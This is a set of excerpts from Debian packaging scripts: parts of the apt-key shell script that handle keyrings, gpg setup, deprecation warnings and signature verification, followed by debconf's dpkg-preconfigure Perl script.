   325		    return 1
   326		fi
   327	    elif [ "$FILEEXT" = 'asc' ]; then
   328		true #dearmor_filename will deal with them
   329	    else
   330		# most callers ignore unsupported extensions silently
   331		apt_warn "The key(s) in the keyring $1 are ignored as the file has an unsupported filename extension."
   332		return 1
   333	    fi
   334	    return 0
   335	}
   336	
   337	foreach_keyring_do() {
   338	   local ACTION="$1"
   339	   shift
   340	   # if a --keyring was given, just work on this one
   341	   if [ -n "$FORCED_KEYRING" ]; then
   342		$ACTION "$FORCED_KEYRING" "$@"
   343	   else
   344		# otherwise all known keyrings are up for inspection
   345		if accessible_file_exists "$TRUSTEDFILE" && is_supported_keyring "$TRUSTEDFILE"; then
   346		    $ACTION "$TRUSTEDFILE" "$@"
   347		fi
   348		local TRUSTEDPARTS="/etc/apt/trusted.gpg.d"
   349		eval "$(apt-config shell TRUSTEDPARTS Dir::Etc::TrustedParts/d)"
   350		if [ -d "$TRUSTEDPARTS" ]; then
   351		    TRUSTEDPARTS="$(readlink -f "$TRUSTEDPARTS")"
   352		    local TRUSTEDPARTSLIST="$(cd /; find "$TRUSTEDPARTS" -mindepth 1 -maxdepth 1 \( -name '*.gpg' -o -name '*.asc' \))"
   353		    for trusted in $(echo "$TRUSTEDPARTSLIST" | sort); do
   354			if accessible_file_exists "$trusted" && is_supported_keyring "$trusted"; then
   355			    $ACTION "$trusted" "$@"
   356			fi
   357		    done
   358		fi
   359	   fi
   360	}
   361	
   362	list_keys_in_keyring() {
   363	    local KEYRINGFILE="$1"
   364	    shift
   365	    # fingerprint and co will fail if key isn't in this keyring
   366	    aptkey_execute "$GPG_SH" --keyring "$(dearmor_filename "$KEYRINGFILE")" "$@" > "${GPGHOMEDIR}/gpgoutput.log" 2> "${GPGHOMEDIR}/gpgoutput.err" || true
   367	    if [ ! -s "${GPGHOMEDIR}/gpgoutput.log" ]; then
   368		return
   369	    fi
   370	    # we fake gpg header here to refer to the real asc file rather than a temp file
   647	   eval $(apt-config shell TRUSTEDFILE Apt::GPGV::TrustedKeyring)
   648	   eval $(apt-config shell TRUSTEDFILE Dir::Etc::Trusted/f)
   649	   if [ "$APT_KEY_NO_LEGACY_KEYRING" ]; then
   650	        TRUSTEDFILE="/dev/null"
   651	   fi
   652	fi
   653	
   654	command="$1"
   655	if [ -z "$command" ]; then
   656	    usage
   657	    exit 1
   658	fi
   659	shift
   660	
   661	prepare_gpg_home() {
   662	    # crude detection if we are called from a maintainerscript where the
   663	    # package depends on gnupg or not. We accept recommends here as
   664	    # well as the script hopefully uses apt-key optionally then like e.g.
   665	    # debian-archive-keyring for (upgrade) cleanup did
   666	    if [ -n "$DPKG_MAINTSCRIPT_PACKAGE" ] && [ -z "$APT_KEY_DONT_WARN_ON_DANGEROUS_USAGE" ]; then
   667		if ! dpkg-query --show --showformat '${Pre-Depends}${Depends}${Recommends}\n' "$DPKG_MAINTSCRIPT_PACKAGE" 2>/dev/null | grep -E -q 'gpg|gnupg'; then
   668		    cat >&2 <<EOF
   669	Warning: The $DPKG_MAINTSCRIPT_NAME maintainerscript of the package $DPKG_MAINTSCRIPT_PACKAGE
   670	Warning: seems to use apt-key (provided by apt) without depending on gpg, gnupg, or gnupg2.
   671	Warning: This will BREAK in the future and should be fixed by the package maintainer(s).
   672	Note: Check first if apt-key functionality is needed at all - it probably isn't!
   673	EOF
   674		fi
   675	    fi
   676	    eval "$(apt-config shell GPG_EXE Apt::Key::gpgcommand)"
   677	    if [ -n "$GPG_EXE" ] && command_available "$GPG_EXE"; then
   678		true
   679	    elif command_available 'gpg'; then
   680		GPG_EXE="gpg"
   681	    elif command_available 'gpg2'; then
   682		GPG_EXE="gpg2"
   683	    elif command_available 'gpg1'; then
   684		GPG_EXE="gpg1"
   685	    else
   686		apt_error 'gnupg, gnupg2 and gnupg1 do not seem to be installed, but one of them is required for this operation'
   687		exit 255
   688	    fi
   689	
   690	    create_gpg_home
   691	
   692	    # now tell gpg that it shouldn't try to maintain this trustdb file
   693	    echo "#!/bin/sh
   694	exec '$(escape_shell "${GPG_EXE}")' --ignore-time-conflict --no-options --no-default-keyring \\
   695	--homedir '$(escape_shell "${GPGHOMEDIR}")' --no-auto-check-trustdb --trust-model always \"\$@\"" > "${GPGHOMEDIR}/gpg.0.sh"
   696	    GPG_SH="${GPGHOMEDIR}/gpg.0.sh"
   697	    GPG="$GPG_SH"
   698	
   699	    # create the trustdb with an (empty) dummy keyring
   700	    # older gpgs required it, newer gpgs even warn that it isn't needed,
   701	    # but require it nonetheless for some commands, so we just play safe
   702	    # here for the foreseeable future and create a dummy one
   703	    touch "${GPGHOMEDIR}/empty.gpg"
   704	    if ! "$GPG_EXE" --ignore-time-conflict --no-options --no-default-keyring \
   705	       --homedir "$GPGHOMEDIR" --quiet --check-trustdb --keyring "${GPGHOMEDIR}/empty.gpg" >"${GPGHOMEDIR}/gpgoutput.log" 2>&1; then
   706	       cat >&2 "${GPGHOMEDIR}/gpgoutput.log"
   707	       false
   708	    fi
   709	
   710	    # We don't usually need a secret keyring, of course, but
   711	    # for advanced operations, we might really need a secret keyring after all
   712	    if [ -n "$FORCED_SECRET_KEYRING" ] && [ -r "$FORCED_SECRET_KEYRING" ]; then
   713		if ! aptkey_execute "$GPG" -v --batch --import "$FORCED_SECRET_KEYRING" >"${GPGHOMEDIR}/gpgoutput.log" 2>&1; then
   714		    # already imported keys cause gpg1 to fail for some reason… ignore this error
   715		    if ! grep -q 'already in secret keyring' "${GPGHOMEDIR}/gpgoutput.log"; then
   716			cat >&2 "${GPGHOMEDIR}/gpgoutput.log"
   717			false
   718		    fi
   719		fi
   720	    else
   721	       # and then, there are older versions of gpg which panic and implode
   722	       # if there isn't one available - and writeable for imports
   723	       # and even if not output is littered with the creation of a secring,
   724	       # so lets call import once to have it create what it wants in silence
   725	       echo -n | aptkey_execute "$GPG" --batch --import >/dev/null 2>&1 || true
   726	    fi
   727	}
   728	
   729	warn_on_script_usage() {
   730	    if [ -n "$APT_KEY_DONT_WARN_ON_DANGEROUS_USAGE" ]; then
   731		return
   732	    fi
   733	    # (Maintainer) scripts should not be using apt-key
   734	    if [ -n "$DPKG_MAINTSCRIPT_PACKAGE" ]; then
   735		echo >&2 "Warning: apt-key should not be used in scripts (called from $DPKG_MAINTSCRIPT_NAME maintainerscript of the package ${DPKG_MAINTSCRIPT_PACKAGE})"
   736	    fi
   737	
   738	    echo >&2 "Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8))."
   739	}
   740	
   741	warn_outside_maintscript() {
   742	    # In del, we want to warn in interactive use, but not inside maintainer
   743	    # scripts, so as to give people a chance to migrate keyrings.
   744	    #
   745	    # FIXME: We should always warn starting in 2022.
   746	    if [ -z "$DPKG_MAINTSCRIPT_PACKAGE" ]; then
   747		echo >&2 "Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8))."
   748	    fi
   749	}
   750	
   751	if [ "$command" != 'help' ] && [ "$command" != 'verify' ]; then
   752	    prepare_gpg_home
   753	fi
   754	
   755	case "$command" in
   756	    add)
   757		warn_on_script_usage
   758		requires_root
   759		setup_merged_keyring
   760		aptkey_execute "$GPG" --quiet --batch --import "$@"
   801	    verify)
   802		GPGV=''
   803		ASSERT_PUBKEY_ALGO=''
   804		eval $(apt-config shell GPGV Apt::Key::gpgvcommand ASSERT_PUBKEY_ALGO Apt::Key::assert-pubkey-algo)
   805		if [ -n "$GPGV" ] && command_available "$GPGV"; then true;
   806		elif command_available 'gpgv'; then GPGV='gpgv';
   807		elif command_available 'gpgv2'; then GPGV='gpgv2';
   808		elif command_available 'gpgv1'; then GPGV='gpgv1';
   809		else
   810		   apt_error 'gpgv, gpgv2 or gpgv1 required for verification, but neither seems installed'
   811		   exit 29
   812		fi
   813		GPGV_ARGS=""
   814		if [ "$ASSERT_PUBKEY_ALGO" ]; then
   815			test="$(LC_ALL=C.UTF-8 "$GPGV" --assert-pubkey-algo 2>&1 || :)"
   816			case "$test" in
   817				*"missing argument"*)
   818					GPGV_ARGS="--assert-pubkey-algo=$ASSERT_PUBKEY_ALGO"
   819					;;
   820				*[Ii]"nvalid option"*"assert-pubkey-algo"*)
   821					;;
   822				*)
   823					apt_warn "Unknown response from gpgv to --assert-pubkey-algo check: $test"
   824					;;
   825			esac
   826		fi
   827		# for a forced keyid we need gpg --export, so full wrapping required
   828		if [ -n "$FORCED_KEYID" ]; then
   829		    prepare_gpg_home
   830		else
   831		    create_gpg_home
   832		fi
   833		setup_merged_keyring
   834		if [ -n "$FORCED_KEYRING" ]; then
   835		    "$GPGV" $GPGV_ARGS --homedir "${GPGHOMEDIR}" --keyring "$(dearmor_filename "${FORCED_KEYRING}")" --ignore-time-conflict "$@"
   836		else
   837		    "$GPGV" $GPGV_ARGS --homedir "${GPGHOMEDIR}" --keyring "${GPGHOMEDIR}/pubring.gpg" --ignore-time-conflict "$@"
   838		fi

== debconf apt preconfigure relevant lines ==
     1	#!/usr/bin/perl
     2	# This file was preprocessed, do not edit!
     3	
     4	
     5	
     6	use warnings;
     7	use strict;
     8	
     9	BEGIN {
    10		eval qq{
    11			use File::Path qw(make_path remove_tree);
    12			use FileHandle;
    13			use Debconf::Log qw(:all);
    14			use Debconf::Db;
    15			use Debconf::Template;
    16			use Debconf::Config;
    17			use Debconf::AutoSelect qw(:all);
    18			use Debconf::Gettext;
    19			use Debconf::Path;
    20		};
    21		if ($@) {
    22			print STDERR "debconf: Perl may be unconfigured ($@) -- aborting\n";
    23			exit 0;
    24		}
    25	}
    26	
    27	if (exists $ENV{DEBCONF_USE_CDEBCONF} and $ENV{DEBCONF_USE_CDEBCONF} ne '') {
    28	    exec "/usr/lib/cdebconf/dpkg-preconfigure", @ARGV;
    29	}
    30	
    31	Debconf::Db->load;
    32	
    33	my $apt=0;
    34	Debconf::Config->getopt(
    35	qq{Usage: dpkg-preconfigure [options] [debs]
    36	       --apt			Apt mode.},
    37		"apt"			=> \$apt,
    38	);
    39	
    40	$|=1;
    41	
    42	my @debs=@ARGV;
    43	@ARGV=();
    44	
    45	my $have_tty=1;
    46	
    47	if ($apt) {
    48		while (<STDIN>) {
    49			chomp;
    50			push @debs, $_ if length $_;
    51		}
    52	
    53		exit unless @debs;
    54	
    55		$have_tty=0 unless open (STDIN, "<", "/dev/tty");
    56	}
    57	elsif (! @debs) {
    58		print STDERR sprintf("dpkg-preconfigure: ".gettext("must specify some debs to preconfigure")), "\n";
    59		exit(1);
    60	}
    61	
    62	if (! Debconf::Path::find("apt-extracttemplates")) {
    63		warn gettext("delaying package configuration, since apt-utils is not installed");
    64		exit;
    65	}
    66	
    67	my $frontend=make_frontend();
    68	
    69	if (! $have_tty && $frontend->need_tty) {
    70		print STDERR sprintf("dpkg-preconfigure: ".gettext("unable to re-open stdin: %s"), $!)."\n";
    71		exit 0;
    72	}
    73	
    74	my $tempdir='/var/cache/debconf/tmp.ci';
    75	remove_tree($tempdir, { safe => 1, keep_root => 1 });
    76	make_path($tempdir);
    77	
    78	my ($package, $version, $template, $config);
    79	pipe(my $info_reader, my $info_writer) or die "debconf: pipe failed: $!";
    80	my $pid = fork();
    81	defined $pid or die "fork failed: $!";
    82	unless ($pid) {
    83		close($info_reader);
    84	
    85		my $command_max=20000; # LINUX SPECIFIC!!
    86		my $static_len=length("apt-extracttemplates");
    87		my $len=$static_len;
    88		my @collect;
    89		my $progress=0;
    90		my $show_progress=($apt && @debs > 30 && -t STDERR);
    91	
    92		sub apt_extracttemplates {
    93			my $apt_extracttemplates_pid = fork();
    94			my $error;
    95			if (not defined $apt_extracttemplates_pid) {
    96				$error = $!;
    97			} elsif (not $apt_extracttemplates_pid) {
    98				open(STDOUT, ">&", $info_writer)
    99					or die "debconf: redirect stdout failed: $!";
   100				exec("apt-extracttemplates", "--tempdir", $tempdir, @collect)
   101					or die "debconf: exec apt-extracttemplates failed: $!";
   102			} else {
   103				my $child = waitpid($apt_extracttemplates_pid, 0);
   104				if ($child == -1) {
   105					$error = $!;
   106				} elsif ($?) {
   107					$error = $?;
   108				}
   109			}
   110			print STDERR sprintf("debconf: ".gettext("apt-extracttemplates failed: %s")."\n", $error) if defined $error;
   156	
   157	foreach my $line (@buffer) {
   158		($package, $version, $template, $config)=split /\s/, $line;
   159	
   160		if (defined $config && length $config && -e $config) {
   161			debug user => sprintf("preconfiguring %s (%s)",$package,$version);
   162			chmod(0755, $config) or
   163				die sprintf(gettext("debconf: can't chmod: %s"), $!);
   164			$frontend->default_title($package);
   165			$frontend->info(undef);
   166			my $confmodule=make_confmodule($config, 'configure', $version);
   167			$confmodule->owner($package);
   168			1 while ($confmodule->communicate);
   169			if ($confmodule->exitcode > 0) {
   170				print STDERR sprintf(
   171					gettext("%s failed to preconfigure, with exit status %s"),
   172					$package, $confmodule->exitcode)."\n";
   173			}
   174			unlink $config;
   175		}
   176	}
   177	
   178	$frontend->shutdown;
   179	
   180	Debconf::Db->save;
   181	
   182	remove_tree($tempdir, { safe => 1, keep_root => 1 });
   183	

